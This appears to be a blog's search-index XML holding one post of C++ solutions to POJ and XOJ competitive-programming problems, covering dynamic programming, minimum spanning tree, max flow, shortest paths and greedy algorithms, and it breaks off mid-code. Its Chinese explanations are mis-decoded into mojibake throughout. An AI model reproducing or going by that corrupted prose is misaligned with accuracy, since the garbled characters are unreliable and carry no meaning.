<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[ACM-OJ[é•¿æœŸæ›´æ–°]]]></title>
      <url>%2F3017%2F06%2F19%2FACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%2F</url>
      <content type="text"><![CDATA[æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š2017-06-21å¹²è„†æŠŠè‡ªå·±å¹³æ—¥åšçš„é¢˜æ”¾åœ¨ä¸€ç¯‡æ–‡ç« é‡Œå§ã€‚ä¸ç„¶å¤ªåˆ†æ•£äº†ã€‚POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617XOJ: 1004 1005 1022 1061 1062 1075 1078 1316 POJ1163é¢˜ç›®http://poj.org/problem?id=1163 æ€è·¯è§ä¸‹é¢POJ-3176é¢˜åˆ†æž æäº¤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 1258é¢˜ç›®http://poj.org/problem?id=1258 æ€è·¯æœ€å°ç”Ÿæˆæ ‘ã€‚ æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define MAX 105#define INF 0xFFFFFFusing namespace std;int n;int cost[MAX][MAX] ;int mincost[MAX];bool used[MAX];int prim() &#123; for ( int i = 0; i &lt; n; i++)&#123; mincost[i] = INF; used[i] = false; &#125; mincost[0] = 0; int res = 0; while ( true )&#123; int v = -1; for ( int u = 0; u &lt; n; u++)&#123; if ( !used[u] &amp;&amp; ( v == -1 || mincost[u] &lt; mincost[v])) v = u; &#125; if ( v == -1 ) break; used[v] = true; res += mincost[v]; for (int u = 0; u &lt; n; u++) mincost[u] = min(mincost[u], cost[v][u]); &#125; return res;&#125;int main()&#123; while(scanf("%d",&amp;n) != EOF )&#123; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n; j++) cost[i][j] = INF; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n ; j++) scanf("%d", &amp;cost[i][j]); printf("%d\n",prim()); &#125; return 0;&#125; 1273é¢˜ç›®http://poj.org/problem?id=1273 æ€è·¯æ¨¡æ¿é¢˜ç›®ï¼Œç›´æŽ¥æ±‚æœ€å¤§æµå°±å¯ä»¥ã€‚æˆ‘ç”¨äº†vectoræ¥æž„é€ é‚»æŽ¥è¡¨ï¼Œè€Œè¿™é¢˜çš„è¾“å…¥æ—¶ä¸€æ¬¡åŒ…å«äº†å¾ˆå¤šä¸ªæµ‹è¯•ä¾‹å­ã€‚æ‰€ä»¥æ¯æ¬¡è¯»å®ŒåŽéƒ½éœ€è¦å¯¹é‚»æŽ¥è¡¨è¿›è¡Œåˆå§‹åŒ–ï¼Œå³è¿›è¡Œä¸‹é¢çš„æ“ä½œï¼š12for (int i = 1; i &lt;= m; i++ ) G[i].clear(); æ–¹æ³•æ˜¯ç½‘ä¸Šæ‰¾çš„ï¼Œç½‘ä¸Šè¯´è¿™æ ·æ¸…ç©ºäº†å…ƒç´ ï¼Œä½†ä¸ä¼šå›žæ”¶å†…å­˜ã€‚ æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;memory.h&gt;#define MAX 205#define INF 0x7fffffffusing namespace std;struct edge &#123;int to ,cap, rev;&#125;;vector&lt;edge&gt; G[MAX];bool used[MAX];int n,m;void add_edge(int from, int to,int cap)&#123; edge one,two; one.to = to; one.cap = cap; one.rev = (int)(G[to].size()); G[from].push_back(one); two.to = from; two.cap = 0; two.rev = (int)(G[from].size()-1); G[to].push_back(two);&#125;int dfs(int v, int t, int f)&#123; if ( v == t) return f; used[v] = true; for ( int i = 0; i &lt; (int)G[v].size(); i++)&#123; edge &amp;e = G[v][i]; if ( !used[e.to] &amp;&amp; e.cap &gt; 0)&#123; int d = dfs(e.to,t, f &gt; e.cap?e.cap:f); if ( d &gt; 0) &#123; e.cap -= d; G[e.to][e.rev].cap += d; return d; &#125; &#125; &#125; return 0;&#125;int max_flow(int s, int t)&#123; int flow = 0; for (;;)&#123; memset(used, 0, sizeof(used)); int f = dfs(s,t,INF); if (f == 0) return flow; flow += f; &#125;&#125;int main()&#123; while (scanf("%d%d",&amp;n,&amp;m) != EOF)&#123; for (int i = 1; i &lt;= m; i++ ) G[i].clear(); for (int i = 0; i &lt; n; i++)&#123; int s, t,c; scanf("%d%d%d",&amp;s,&amp;t,&amp;c); add_edge(s,t,c); &#125; printf("%d\n",max_flow(1,m)); &#125; return 0;&#125; 1979é¢˜ç›®http://poj.org/problem?id=1979 æ€è·¯DFS() æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define X 20#define Y 20using namespace std;int x,y;int nx,ny;int sx,sy;int num;char maze[X][Y];int dx[4] = &#123;-1,0,1,0&#125;;int dy[4] = &#123;0,1,0,-1&#125;;void dfs(int r, int s)&#123; num += 1; maze[r][s] = '#'; for (int i = 0; i &lt; 4; i++)&#123; int t1 = r+dx[i]; int t2 = s+dy[i]; if (0 &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; 0 &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == '.')&#123; dfs(t1,t2); &#125; &#125;&#125;int main()&#123; scanf("%d%d",&amp;y,&amp;x); while( x != 0 &amp;&amp; y != 0)&#123; num = 0; for (int i = 0; i &lt; x; i++)&#123; for (int j = 0; j &lt; y; j++)&#123; scanf("\n%c",&amp;maze[i][j]); if (maze[i][j] == '@')&#123; sx = i; sy = j; &#125; &#125; &#125; dfs(sx,sy); printf("%d\n",num); scanf("%d%d",&amp;y,&amp;x); &#125; return 0;&#125; 2387é¢˜ç›®http://poj.org/problem?id=2387 æ€è·¯æœ€çŸ­è·¯å¾„ + é˜Ÿåˆ—ä¼˜å…ˆ ã€‚è¿™é¢˜ç«Ÿç„¶æ˜¯å…ˆè¯»å…¥è¾¹æ•°å†è¯»å…¥é¡¶ç‚¹æ•°ï¼Œï¼¯rzå¦å¤–ä¼šæœ‰ é‡è¾¹ï¼Œ ä¸è¿‡å¦‚æžœç”¨é‚»æŽ¥è¡¨å®žçŽ°çš„è¯ï¼Œå¯ä»¥ä¸ç”¨ç®¡ï¼Œå¦‚æžœé‚»æŽ¥çŸ©é˜µæ¥å®žçŽ°çš„è¯ï¼Œæœ€åŽçŸ©é˜µä¸­å­˜å‚¨çš„æ˜¯ä»Žç‚¹åˆ°ç‚¹çš„å¤šæ¡è¾¹çš„æœ€å°å€¼ã€‚ æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#define MAX_V 200000#define INF 0xFFFFFFusing namespace std;struct edge &#123; int to, cost, flag ;&#125;;typedef pair&lt;int, int&gt; P;int V;int E;vector&lt;edge&gt; G[MAX_V];int d[MAX_V];void dijkstra(int s);int main()&#123; scanf("%d%d", &amp;E,&amp;V); for (int i = 0; i &lt; E; i++)&#123; int s, t, cost; edge temp1,temp2; scanf("%d%d%d", &amp;s, &amp;t, &amp;cost); temp1.to = t; temp1.cost = cost; G[s].push_back(temp1); temp2.to = s; temp2.cost = cost; G[t].push_back(temp2); &#125; dijkstra(1); printf("%d",d[V]); return 0;&#125;void dijkstra(int s)&#123; priority_queue&lt;P, vector&lt;P&gt;, greater&lt;P&gt; &gt; que; fill(d+1,d + V+1, INF); d[s] = 0; que.push(P(0,s)); while ( !que.empty())&#123; P p = que.top(); que.pop(); int v = p.second; if ( d[v] &lt; p.first) continue; for (int i = 0; i &lt; G[v].size(); i++)&#123; edge e = G[v][i]; if ( d[e.to] &gt; d[v] + e.cost) &#123; d[e.to] = d[v] + e.cost; que.push(P(d[e.to], e.to)); &#125; &#125; &#125;&#125; 2388é¢˜ç›®http://poj.org/problem?id=2388 æ€è·¯å…ˆæŽ’åºï¼Œä¹‹åŽæ‰“å°å‡ºä¸­é—´å€¼ã€‚æ°´é¢˜ã€‚ æäº¤stl1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; sort(arr,arr+n); printf("%d",arr[n/2]); return 0;&#125; å¿«æŽ’12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];void quick_sort(int l,int h)&#123; if(h&lt;l+2)return ; int e=h,p=l; while(l&lt;h) &#123; while(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]); while(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]); if(l&lt;h) swap(arr[l],arr[h]); &#125; swap(arr[h],arr[p]); quick_sort(p,h); quick_sort(l,e);&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; quick_sort(0,n); printf("%d",arr[n/2]); return 0;&#125; 3069é¢˜ç›®http://poj.org/problem?id=3069 æ€è·¯è´ªå¿ƒç®—æ³•ã€‚åœ¨ while( i &lt; n ) å¾ªçŽ¯ä¸­ï¼Œç¬¬ä¸€ä¸ªwhileå¾ªçŽ¯ï¼Œæ‰¾åˆ°è·ç¦»å½“å‰ç‚¹ï¼ˆæœªè¦†ç›–ï¼‰å¤§äºŽrçš„ç¬¬ä¸€ä¸ªç‚¹ï¼Œè¯¥ç‚¹çš„å‰ä¸€ä¸ªï¼ˆiâ€”ï¼‰åšä¸Šæ ‡è®°ã€‚ç¬¬äºŒä¸ªwhileå¾ªçŽ¯ï¼Œä»Žå·²ç»æ ‡è®°çš„ç‚¹å‡ºå‘ï¼Œæ‰¾åˆ°è·ç¦»å½“å‰ç‚¹ï¼ˆå·²ç»è¦†ç›–ï¼‰å¤§äºŽrçš„ç¬¬ä¸€ä¸ªç‚¹ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸‹ä¸€æ¬¡å¤§å¾ªçŽ¯çš„èµ·ç‚¹ã€‚ æäº¤123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define N 1005using namespace std;int n;int r;int loc[N];int marknum;int main()&#123; scanf("%d%d",&amp;r,&amp;n); while ( n != -1 &amp;&amp; r != -1)&#123; for (int i = 0; i &lt; n; i++) scanf("%d",&amp;loc[i]); sort(loc,loc+n); marknum = 0; int i = 0; int j = 0; while ( i &lt; n )&#123; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] ) i++; i--; marknum++; j = i; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i]) i++; j = i; &#125; printf("%d\n",marknum); scanf("%d%d",&amp;r,&amp;n); &#125; return 0;&#125; 3176é¢˜ç›®http://poj.org/problem?id=3176 æ€è·¯äºŒç»´æ•°ç»„triangleç”¨äºŽä¿å­˜ä¸‰è§’å½¢ï¼ŒäºŒç»´æ•°ç»„wayç”¨äºŽä¿å­˜è·¯å¾„ã€‚ä»¥é¢˜ç›®æ•°æ®ä¸ºä¾‹ï¼š1234573 88 1 02 7 4 44 5 2 6 5 åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š æœ€å·¦è¾¹ï¼Œåªèƒ½ä»Žä¸Šä¸€è¡Œçš„åŒåˆ—æ¥ï¼Œway[i][j] = way[i-1][j] + triangle[i][j] æœ€å³è¾¹ï¼Œåªèƒ½ä»Žä¸Šä¸€è¡Œçš„æ–œå¯¹è§’çº¿æ¥ï¼Œway[i-1][j-1] + triangle[i][j]; ä¸­é—´ï¼Œå¯ä»¥ä»Žä¸Šä¸€è¡Œçš„å·¦è¾¹æˆ–è€…å³è¾¹æ¥ï¼Œway[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; å¡«è¡¨å®ŒæˆåŽï¼Œå¯¹æœ€åŽä¸€è¡Œway[n-1][]æ‰¾å‡ºæœ€å¤§å€¼å³ä¸ºç­”æ¡ˆã€‚ æäº¤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 3253é¢˜ç›®http://poj.org/problem?id=3253 æ€è·¯éœå¤«æ›¼æ ‘çš„å˜å½¢ã€‚é‡ç‚¹åœ¨äºŽå¯¹ä¸¤ä¸ªæœ€å°å€¼ç›¸åŠ åŽå¯¹æ•°ç»„çš„å¤„ç†ã€‚ æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;using namespace std;int n;int k;int len[20005];int total;void solve()&#123; long long ans = 0; while ( n &gt; 1 )&#123; int mii1 = 0; int mii2 = 1; if (len[mii1] &gt; len[mii2]) swap(mii1,mii2); for (int i = 2; i &lt; n; i++)&#123; if (len[i] &lt; len[mii1])&#123; mii2 = mii1; mii1 = i; &#125; else if (len[i] &lt; len[mii2])&#123; mii2 = i; &#125; &#125; int t = len[mii1] + len[mii2]; ans += t; if (mii1 == n-1) swap(mii1,mii2); len[mii1] = t; len[mii2] = len[n-1]; n--; &#125; printf("%lld\n",ans);&#125;int main()&#123; total = 0; k = 0; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;len[i]); &#125; solve(); return 0;&#125; 3617é¢˜ç›®http://poj.org/problem?id=3617 æ€è·¯è´ªå¿ƒç®—æ³•ï¼Œæ¯æ¬¡é€‰æ‹©æŽ’åºé å‰çš„å­—æ¯åŠ åˆ°å­—ç¬¦ä¸²tä¸­ã€‚å¦‚æžœä¸¤ä¸ªæŽ’åºç›¸åŒï¼Œåˆ™çœ‹å®ƒä»¬çš„ä¸‹ä¸€ä¸ªå­—æ¯çš„é¡ºåºï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªé€’å½’å‡½æ•°æ¥åˆ¤æ–­ã€‚ æäº¤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;using namespace std;int n;char s[2005];char t[2005];int sp,ep;int compare(int i,int j)&#123; if (s[i] &gt; s[j])&#123; return 1; &#125; else if (s[i] &lt; s[j])&#123; return 0; &#125; else if (s[i] == s[j])&#123; i++; j--; return compare(i,j); &#125;&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf(" %c",&amp;s[i]); &#125; sp = 0; ep = n-1; int lenoft = 0; while (lenoft != n)&#123; int p = compare(sp,ep); if (p == 0)&#123; t[lenoft] = s[sp]; sp++; lenoft++; &#125; else if (p == 1)&#123; t[lenoft] = s[ep]; ep--; lenoft++; &#125; &#125; for (int i = 1; i &lt;= n; i++)&#123; printf("%c",t[i-1]); if (i % 80 == 0) printf("\n"); &#125; printf("\n"); return 0;&#125; XOJ1004æƒ³æ³•å†’æ³¡ç­‰å¯èƒ½ä¼šè¶…æ—¶ã€‚å †æŽ’åºå’Œå¿«æŽ’çš„å¤æ‚åº¦éƒ½æ˜¯ O(nlogn)ã€‚è¯¾ä¸Šä¸ºäº†èŠ‚çº¦æ—¶é—´æ‰€ä»¥ï¼šï¼‰ æäº¤12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[1000004];int main()&#123; int n; scanf("%d",&amp;n); int i,j; for(i = 0;i &lt; n;i++) scanf("%d",&amp;arrays[i]); sort(arrays,arrays+n); for(j = 0;j &lt; n - 1;j++) printf("%d ",arrays[j]); printf("%d",arrays[n - 1]); return 0;&#125; ojå¯¹æ ¼å¼è¦æ±‚å¥½ä¸¥æ ¼â€¦ 1005æ­¤é¢˜å¦å†™ä¸€ç¯‡æ–‡ç« äº†ã€‚ 1022æƒ³æ³•ç›´æŽ¥ç”¨æ™®é€šçš„çŸ©é˜µä¹˜æ³•å°±è¿‡äº†ï¼Œæ—¶é—´å¤æ‚åº¦ O(n^3) æäº¤123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;stdio.h&gt;int main()&#123; int n1,m1; int n2,m2; int matrix1[100][100]; int matrix2[100][100]; scanf("%d%d",&amp;n1,&amp;m1); int i,j; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m1;j++) scanf("%d",&amp;matrix1[i][j]); scanf("%d%d",&amp;n2,&amp;m2); for(i = 0;i &lt; n2;i++) for(j = 0;j &lt; m2;j++) scanf("%d",&amp;matrix2[i][j]); int matrix3[100][100]; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m2;j++) matrix3[i][j]=0; int i1,j2; for(i1 = 0;i1 &lt; n1;i1++) for(j2 = 0;j2 &lt; m2;j2++) for(j = 0;j &lt; n2;j++) matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2]; for(i = 0;i &lt; n1;i++) &#123; for(j = 0;j &lt; m2 - 1;j++) printf("%d ",matrix3[i][j]); printf("%d\n",matrix3[i][m2-1]); &#125; return 0;&#125; 1061æƒ³æ³•è´ªå¿ƒç®—æ³•ã€‚å…¶å®žå°±æ˜¯ä»»åŠ¡é€‰æ‹©é—®é¢˜ã€‚ æŒ‰ç…§çº¦ä¼šå®Œæˆæ—¶é—´ä»Žæ—©åˆ°æ™šæŽ’åº é€‰æ‹©å…·æœ‰æœ€æ—©å®Œæˆæ—¶é—´çš„girl å°†æ­¤girlåŠ å…¥åˆ°çº¦ä¼šåˆ—è¡¨ä¸­ å¯¹å­é—®é¢˜é‡å¤ä¸Šè¿°é—®é¢˜ å¼ºçƒˆè°´è´£Ckp æäº¤12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;typedef struct info&#123; char name[16]; char starttime[6]; char endtime[6];&#125;info;void quick_sort(info * s, int l, int r,int n);int main()&#123; int n; static info mm[1005] ; static info mmcopy[1005]; scanf("%d",&amp;n); int i,j; for (i = 1; i &lt;= n; i++)&#123; scanf("%s%s%s",mm[i].name,mm[i].starttime,mm[i].endtime); &#125; quick_sort(mm,1,n,n); strcpy(mmcopy[1].endtime,mm[1].endtime); strcpy(mmcopy[1].name,mm[1].name); strcpy(mmcopy[1].starttime,mm[1].starttime); int cal = 1; for (i = 2; i &lt;= n; i++)&#123; if (strcmp(mmcopy[cal].endtime,mm[i].starttime) &lt;= 0)&#123; cal++; strcpy(mmcopy[cal].endtime,mm[i].endtime); strcpy(mmcopy[cal].name,mm[i].name); strcpy(mmcopy[cal].starttime,mm[i].starttime); &#125; &#125; printf("%d\n",cal); for ( i = 1; i &lt; cal; i++)&#123; printf("%s ",mmcopy[i].name); &#125; printf("%s",mmcopy[i].name); return 0;&#125;void quick_sort(info* s, int l, int r,int n)&#123; if (l &lt; r)&#123; int i = l, j = r; int temp; info x; strcpy(x.endtime,s[l].endtime); strcpy(x.name,s[l].name); strcpy(x.starttime,s[l].starttime); while (i &lt; j) &#123; while(i &lt; j &amp;&amp; strcmp(s[j].endtime,x.endtime) &gt;= 0) j--; if(i &lt; j)&#123; strcpy(s[i].endtime,s[j].endtime); strcpy(s[i].starttime,s[j].starttime); strcpy(s[i].name , s[j].name); i++; &#125; while(i &lt; j &amp;&amp; strcmp(s[i].endtime,x.endtime) &lt; 0) i++; if(i &lt; j)&#123; strcpy(s[j].endtime,s[i].endtime); strcpy(s[j].starttime,s[i].starttime); strcpy(s[j].name,s[i].name); j--; &#125; &#125; strcpy(s[i].endtime,x.endtime); strcpy(s[i].starttime,x.starttime); strcpy(s[i].name,x.name); quick_sort(s, l, i - 1,n); quick_sort(s, i + 1, r,n); &#125;&#125; 1062æƒ³æ³•è´ªå¿ƒç®—æ³•ã€‚èƒŒåŒ…é—®é¢˜ã€‚å°½é‡é€‰æ‹©é¢å€¼å¤§çš„ã€‚å°†å…ƒè½¬æ¢ä¸ºè§’ï¼Œè¿™æ ·éƒ½æ˜¯æ•´æ•°ï¼Œè¿›è¡Œå¤„ç†æ›´æ–¹ä¾¿ã€‚ æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;using namespace std;typedef struct zhibi&#123; int number; int value;&#125;zhibi;int main()&#123; int stat = 0; int n; scanf("%d",&amp;n); zhibi arr[7]; int i; for (i = 1; i &lt; 7; i++)&#123; scanf("%d",&amp;arr[i].number); &#125; arr[1].value = 500; arr[2].value = 100; arr[3].value = 50; arr[4].value = 10; arr[5].value = 5; arr[6].value = 1; int remainMoney; remainMoney = 1000 - n * 25; for (i = 1; i &lt; 7; i++)&#123; if (remainMoney == 0)&#123; break; &#125; else &#123; int j = remainMoney / arr[i].value; int number = j&gt;arr[i].number?arr[i].number:j; remainMoney = remainMoney - number*arr[i].value; stat = stat + number; &#125; &#125; if (remainMoney == 0)&#123; printf("%d",stat); &#125; else &#123; printf("-1\n"); &#125; return 0;&#125; 1075æ€è·¯ç›´æŽ¥dijkstraã€‚ é‡‡ç”¨é‚»æŽ¥çŸ©é˜µå­˜å‚¨ã€‚ æäº¤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // ä¿å­˜ å›¾ ï¼ˆå„æƒå€¼ï¼‰int n; // é¡¶ç‚¹æ•°int d[MAXN]; // ä»Žåˆå§‹ç‚¹å‡ºå‘ çš„æœ€çŸ­è·ç¦»bool used[MAXN]; // å·²ç»ä½¿ç”¨è¿‡çš„å›¾void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; 1078æ€è·¯ä»»æ„ä¸¤ç‚¹é—´çš„æœ€çŸ­è·¯å¾„é—®é¢˜çš„å˜ä½“å§ã€‚ä¸€æ—¦æ‰¾å‡ºäº†ä»ŽæŸä¸ªæºç‚¹ï¼ˆäººï¼‰åˆ°å…¶ä»–æ‰€æœ‰äººéœ€è¦çš„å±‚æ•°æ—¶ï¼Œè®°å½•ä¸‹æ¥ï¼Œå¦‚æžœæœ‰çš„äººä¸Žå…¶ä»–æ‰€æœ‰äººéƒ½ä¸è®¤è¯†ï¼Œåˆ™è¯¥å±‚æ•°æ˜¯ æ— ç©·å¤§ï¼ˆINFï¼‰ã€‚ä¹‹åŽé€šè¿‡å¾ªçŽ¯ï¼Œæ‰¾å‡ºä»Žæ¯ä¸ªæºç‚¹å‡ºå‘æ‰€éœ€è¦çš„å±‚æ•°ï¼Œå¹¶å–æœ€å¤§å€¼ã€‚è¦æ³¨æ„çš„æ˜¯ ç®—æ³•æ±‚å¾—æœ€çŸ­è·¯å¾„ æ˜¯ ç»è¿‡äº†å‡ æ¡è·¯å¾„ï¼ˆè·¯å¾„æƒä¸º 1 ï¼Œè·¯å¾„æƒå’Œå³æœ‰å‡ æ¡è·¯å¾„ï¼‰ï¼Œè€Œé¢˜ç›®çš„ å±‚æ•°M æ˜¯æŒ‡ ä¸¤ä¸ªäººä¹‹é—´è¿˜æœ‰å¤šå°‘äººï¼Œå³ç»è¿‡äº†å¤šå°‘ä¸ª ç‚¹ï¼Œ æ‰€ä»¥åœ¨æœ€åŽçš„ç»“æžœä¸­è®°å¾—å‡ä¸€ã€‚ æäº¤dijkstraç®—æ³•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // ä¿å­˜ å›¾ ï¼ˆå„æƒå€¼ï¼‰int n; // é¡¶ç‚¹æ•°int d[MAXN]; // ä»Žåˆå§‹ç‚¹å‡ºå‘ çš„æœ€çŸ­è·ç¦»bool used[MAXN]; // å·²ç»ä½¿ç”¨è¿‡çš„å›¾void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; Floyd-Warshall ç®—æ³•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX 102#define INF 0xfffffint G[MAX][MAX];int n;void warshall_floyd();int min(int a, int b);int max(int a, int b);int main()&#123; int i, j; int M = 0; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++)&#123; scanf("%d", &amp;G[i][j]); if ( G[i][j] == 0) G[i][j] = INF; if ( i == j ) G[i][j] = 0; &#125; warshall_floyd(); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) M = max(M, G[i][j]); if ( M == INF) printf("%d",-1); else printf("%d\n", M-1); return 0;&#125;void warshall_floyd()&#123; int k, i, j; for (k = 1; k &lt;= n; k++) for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) G[i][j] = min(G[i][j], G[i][k] + G[k][j]);&#125;int min(int a, int b)&#123; return a &gt; b ? b : a;&#125;int max(int a, int b)&#123; return a &gt; b ? a : b;&#125; 1316æƒ³æ³•è´ªå¿ƒç®—æ³•ã€‚èƒŒåŒ…é—®é¢˜ã€‚æœ‰åˆ«äºŽ0/1èƒŒåŒ…é—®é¢˜ã€‚æ¯æ¬¡é€‰å–å°½é‡å¤šçš„å•ä½ä»·å€¼é«˜çš„ç‰©ä½“ã€‚ æäº¤12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;using namespace std;typedef struct unit&#123; double unitValue; int id; double weight; double value;&#125;unit;void quick_sort(unit s[], int l, int r);int main()&#123; double m,n; static unit valuesor[100010]; scanf("%lf%lf",&amp;m,&amp;n); int i; for 